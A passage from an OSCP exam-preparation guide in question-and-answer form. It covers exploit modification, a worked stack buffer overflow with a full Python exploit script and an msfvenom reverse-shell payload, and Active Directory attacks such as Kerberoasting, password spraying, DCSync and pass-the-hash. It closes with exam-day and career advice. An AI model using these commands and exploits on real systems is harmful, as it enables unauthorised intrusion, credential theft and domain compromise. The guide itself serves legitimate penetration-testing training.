gcc -fno-stack-protector -z execstack exploit.c -o exploit
```

**9. Cross-compiling for Windows:**

```bash
# On Kali, compile for Windows
sudo apt install mingw-w64
i686-w64-mingw32-gcc exploit.c -o exploit.exe  # 32-bit
x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe  # 64-bit
```

**10. Editing publicly known exploits:**

Steps:
1. Read the exploit thoroughly
2. Understand what it does
3. Identify variables to change
4. Test in lab first
5. Adjust until works

**Common ExploitDB modifications:**

```python
# Update target URL
url = "http://TARGET_IP/path"

# Update credentials
username = "admin"
password = "password"

# Update payload
cmd = "id"

# Update shellcode
# (Generated via msfvenom)

# Update encoding
# (Test what target accepts)
```

**Exploit debugging:**

When exploit doesn't work:
1. Run with verbose output
2. Use Burp to see actual requests
3. Compare to manual exploitation
4. Check for WAF/firewall
5. Verify target IS vulnerable
6. Try different shellcode encoder

### Q47: Buffer overflow basics (legacy but useful knowledge)
**A:**

**Note:** Removed from OSCP+ exam, but conceptually important for security understanding. Skip if focused only on exam.

**BOF concept:**

Stack-based:
- Stack stores function variables
- Overflow buffer to overwrite return address
- Control execution flow to your shellcode

**Tools needed:**

- Immunity Debugger / x32dbg
- Mona.py (Immunity plugin)
- msfvenom
- Python for exploit script

**Steps:**

**1. Spike fuzzing (find crash):**

```bash
# Test commands
spike_audit.spk

# Spike fuzzer
generic_send_tcp $IP $PORT spike_audit.spk 0 0
```

**2. Identify crash:**

App crashes, EIP overwritten with your data.

**3. Find offset:**

```bash
# Generate cyclic pattern
msf-pattern_create -l 3000

# Send pattern, get EIP value
# Find offset
msf-pattern_offset -q EIP_VALUE
# Returns: offset 146
```

**4. Verify offset:**

```python
buffer = "A" * 146 + "BBBB" + "C" * (3000 - 150)
# EIP should now be 42424242 (BBBB)
```

**5. Bad character analysis:**

Send all bytes \x01 to \xff, see which corrupt.

**6. Find JMP ESP:**

```python
# In Immunity with Mona
!mona modules
!mona find -s "\xff\xe4" -m vulnerable.dll
# JMP ESP at 0x625011AF
```

**7. Generate shellcode:**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f c -b "\x00\x0a\x0d"
```

**8. Final exploit:**

```python
import socket

target = "10.10.10.5"
port = 9999

offset = 146
ret_addr = "\xaf\x11\x50\x62"  # JMP ESP (little-endian)
nopsled = "\x90" * 16
shellcode = b"\xfc\xe8..."  # From msfvenom

payload = b"A" * offset + ret_addr + nopsled + shellcode + b"C" * 100

s = socket.socket()
s.connect((target, port))
s.send(payload + b"\r\n")
```

**Listener:**

```bash
nc -lvnp 4444
```

**Common BOF challenges:**

- Bad character filtering
- DEP/ASLR (modern Windows)
- Egghunter techniques
- ROP chains

**For OSCP+:** Not on exam, but understanding helps with other topics.

### Q48: OSCP AD attack scenarios specific
**A:**

**Common OSCP AD chains (3 machines):**

**Scenario 1: Web → User → Domain Admin**

```
Machine 1 (Web Server): 
  - Vulnerable web app (SQLi, RCE, etc.)
  - Initial foothold as service account
  - SeImpersonate → SYSTEM
  - Mimikatz finds domain user creds

Machine 2 (File Server):
  - Login with discovered creds
  - User is local admin (password reuse)
  - Mimikatz finds admin domain user creds

Machine 3 (Domain Controller):
  - Login as domain admin user
  - DCSync or direct DC access
  - Get all hashes / DA flag
```

**Scenario 2: Service account compromise**

```
Machine 1:
  - Initial credentials provided
  - Enumerate domain, find Kerberoastable user
  - Kerberoast, crack weak password
  - Service account is admin on Machine 2

Machine 2:
  - WinRM with service account creds
  - Local admin
  - LSASS dump reveals more accounts
  - One is DA

Machine 3:
  - Login as DA
  - Compromise complete
```

**Scenario 3: ACL abuse chain**

```
Machine 1:
  - Web foothold or given creds
  - BloodHound shows GenericWrite on user

Machine 2:
  - User has admin via group nesting
  - Login, dump credentials

Machine 3:
  - Discovered DA creds work
  - Domain compromise
```

**Common AD attacks to practice for OSCP:**

**1. Kerberoasting:**
```bash
GetUserSPNs.py corp.local/user:pass -dc-ip $DC -request
hashcat -m 13100 hash rockyou.txt
```

**2. AS-REP roasting:**
```bash
GetNPUsers.py corp.local/ -no-pass -usersfile users.txt -dc-ip $DC
```

**3. Password spray:**
```bash
crackmapexec smb $TARGETS -u users.txt -p 'Spring2024!'
```

**4. ACL abuse:**
```powershell
# After identifying via BloodHound
Set-DomainUserPassword -Identity victim -AccountPassword $newpass
Add-DomainGroupMember -Identity "Domain Admins" -Members user
```

**5. DCSync:**
```bash
secretsdump.py corp.local/admin:pass@$DC
```

**6. Pass-the-hash:**
```bash
crackmapexec smb $TARGETS -u user -H $NTHASH
psexec.py -hashes :$NTHASH user@target
```

**Tools to have ready:**

Pre-loaded on Kali:
- impacket suite
- crackmapexec
- bloodhound + bloodhound.py
- evil-winrm
- responder
- mitm6

Pre-loaded for Windows (to transfer):
- mimikatz.exe
- Rubeus.exe
- SharpHound.exe
- PowerView.ps1
- PowerUp.ps1
- WinPEAS.exe
- Invisi-Shell

**OSCP AD enumeration commands (memorize):**

```powershell
# From a Windows machine after foothold
Get-ADUser -Filter *
Get-ADComputer -Filter *
Get-ADGroupMember "Domain Admins"

# PowerView (if loaded)
Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired
Find-LocalAdminAccess
Find-InterestingDomainAcl
```

**From Linux (bloodhound-python):**

```bash
bloodhound-python -c All -u user -p password -d corp.local -ns $DC_IP
```

**OSCP AD specifics:**

- AD set is 3 connected machines
- Initial foothold given or via web
- Must reach DA on DC
- Partial credit limited
- Focus on getting full 40 points

### Q49: Final exam day mental preparation
**A:**

**Week before exam:**

**Day -7 to -3:**
- Take 1 mock exam (24h)
- Identify weaknesses
- Plan to address them
- Stop adding new study material

**Day -2:**
- Light review only
- Test exam setup
- Verify tools work
- Wordlists ready

**Day -1 (rest day):**
- NO studying
- Light exercise
- Good meal
- Early sleep
- Prepare workspace

**Exam morning:**

**Eat well:**
- Protein-heavy breakfast
- Avoid heavy carbs (sluggish)
- Coffee/tea moderate
- Hydrate well

**Setup:**
- 30 min before exam
- Check internet stability
- Webcam tested
- Notes template ready
- Snacks accessible
- Water bottle
- Bathroom break

**Exam start mentality:**

**Hour 0-1:**
- Don't panic
- Read all instructions carefully
- Note rules (Metasploit restrictions etc.)
- Start nmap on all 6 IPs

**Hour 1-6:**
- Methodical enumeration
- Don't tunnel vision
- Document EVERYTHING
- Screenshot constantly

**Hour 6-12:**
- Aim for 50+ points
- If behind, prioritize easier targets
- Take 15 min break each 2 hours
- Eat properly

**Hour 12-16:**
- Sleep 6 hours
- Set alarm
- Phone away

**Hour 16-22:**
- Fresh perspective
- Tackle remaining points
- Don't break working things
- Verify all flags

**Hour 22-24:**
- Final screenshots
- Backup all data
- Note all credentials
- Prepare for report

**Report writing (next 24h):**

**Don't:**
- Start immediately after exam
- Rush
- Skip screenshots
- Use generic descriptions

**Do:**
- Sleep first (4-6 hours)
- Eat properly
- Follow template strictly
- Verify reproducibility
- Multiple drafts

**Mental tips:**

**When stuck:**
- 90 min max per problem
- Walk away
- Different approach
- Different machine

**When tired:**
- Sleep
- 6 hours minimum at 12h mark
- Tired brain = bad decisions

**When discouraged:**
- 70 points = pass
- Not perfection
- One success = momentum
- Keep going

**When successful:**
- Don't get cocky
- Verify
- Document
- Move to next

**Common psychological traps:**

1. **Sunk cost fallacy** - "I've spent 4 hours, I must continue"
2. **Confirmation bias** - "This MUST be the vulnerability"
3. **Tunnel vision** - Missing other machines
4. **Catastrophizing** - "I'm going to fail"
5. **Perfectionism** - Trying for 100 when 70 secured

**Reset techniques:**

- 5-minute walk
- Deep breathing (4-7-8 method)
- Cold water on face
- Healthy snack
- Brief meditation

**Failure scenario:**

If you don't pass:
- Not the end
- Free retake (within validity)
- Better preparation
- Many pass on attempt 2

**Success scenario:**

If you pass:
- Don't share questions/answers
- Celebrate
- Update LinkedIn/resume
- Move to next certification

### Q50: After OSCP - what's next?
**A:**

**Immediate post-OSCP:**

**1. Celebrate:**
- You earned it
- Major milestone
- Take a week off

**2. Update credentials:**
- LinkedIn ("Certified OSCP")
- Resume with cert + date
- Email signature
- Professional profiles

**3. Apply for jobs:**

If looking:
- Pentester roles
- Security consultant
- Bug bounty (intensive)
- Red team (junior)

**4. Bug bounty intensification:**

With OSCP confidence:
- Bigger targets
- More complex apps
- AD-using companies
- Higher payouts

**Next certifications options:**

**Path A: Web specialization**
- **OSWE (PEN-300/AWAE)** - Web app security
- Most expensive but covers code review
- Targets you'd see in bug bounty

**Path B: Red team / AD**
- **CRTP** (you're doing this)
- **CRTE** - Advanced AD
- **OSEP (PEN-300)** - Evasion focus

**Path C: Cloud security**
- **CARTP** - Azure AD attacks
- **CARTE** - Advanced cloud
- AWS/Azure certifications

**Path D: Defensive**
- **GCIH** - Incident handler
- **GCFA** - Forensics
- **CISSP** - Management (after 5 years)

**Path E: Specialty**
- **OSCE3** - Three OffSec advanced certs
- **OSED** - Exploit development
- **OSDA** - Defense analyst

**Recommended for your trajectory (Jagdeep):**

Given your goals (bug bounty + Encrypticle + Indian fintech):

1. ✅ CRTP (in progress)
2. **OSCP** (after CRTP - good supplement)
3. **OSWE** - Most relevant for bug bounty
4. **CRTE** - Deep AD if going corporate
5. **CARTP** - Azure expertise

**For Indian market specifically:**

Most valuable combinations:
- OSCP + Cloud cert (AWS/Azure)
- OSCP + OSWE (offensive depth)
- CISSP + technical certs (management track)

**Cost vs ROI:**

- OSCP+: ~$1500 USD - HIGH ROI
- CRTP: $249 USD - HIGH ROI
- OSWE: $1500 USD - MEDIUM-HIGH ROI (web bug bounty)
- OSEP: $1500 USD - MEDIUM ROI (specialized)
- CARTP: $549 USD - HIGH ROI (cloud growing)
- CISSP: ~$700 + experience requirements

**Skills to develop beyond certs:**

1. **Bug bounty depth** - Real-world experience
2. **Public speaking** - Conferences, meetups
3. **Writing** - Blog posts, articles
4. **Open source** - Tool development
5. **Mentoring** - Through Encrypticle
6. **Networking** - Twitter, Discord, in-person

**Encrypticle integration:**

After OSCP:
- Add OSCP content to your courses
- "Road to OSCP" series
- Mock exam simulation
- AD attack tutorials
- Bug bounty case studies

This positions you uniquely:
- OSCP-certified instructor
- Indian-language content
- Practical bug bounty experience
- Real testimonials

**Career milestones to target:**

**6 months post-OSCP:**
- Senior pentester role
- ₹20-30 LPA in India
- Or freelance consulting
- Encrypticle paid program launched

**1 year post-OSCP:**
- Multiple bug bounty wins
- Conference talk submitted
- Encrypticle growing
- Industry recognition starting

**2 years post-OSCP:**
- Lead/Principal pentester
- ₹30-50+ LPA
- Recognized educator
- Speaker at events
- Possibly international opportunities

**Final advice:**

OSCP is a tool, not the destination. It opens doors but you have to walk through them. Combine it with:
- Practical experience (bug bounty)
- Public presence (Encrypticle)
- Network (community)
- Continuous learning (always evolving)

Your unique combination - technical depth + Indian education + bug bounty success + AD specialization - is rare. OSCP is one more piece that makes you stand out.

Good luck with CRTP, then OSCP. The path is well-laid. Execute consistently.

---

## END OF OSCP PREP (Q1-50 COMPLETE)

**Skills demonstrated:**
- Full OSCP+ exam approach
- Detailed Linux privesc (SUID, sudo, cron, capabilities, kernel)
- Detailed Windows privesc (services, tokens, credentials, AlwaysInstallElevated)
- Password attack techniques
- Network pivoting (chisel, ligolo-ng, SSH)
- Exploit modification
- AD attack scenarios for OSCP
- Mental and practical exam prep
- Post-OSCP career planning

**For your 3-month plan:**
Month 1 focus areas from this content:
- Q31-37: Linux privesc patterns (your noted gap)
- Q41: Stored credentials hunting
- Q42: AlwaysInstallElevated

Month 2 focus:
- Q16-30: Recon and enumeration mastery
- Q44: Password attacks
- Q45: Pivoting

Month 3 focus:
- Q31-37 review (Linux)
- Q38-43 (Windows privesc patterns)
- Q48: AD attack scenarios
- Q49: Mental prep

Best of luck on the journey ahead. The compound effect of CRTP + OSCP + practical bug bounty + Encrypticle's videos will position you exceptionally well.
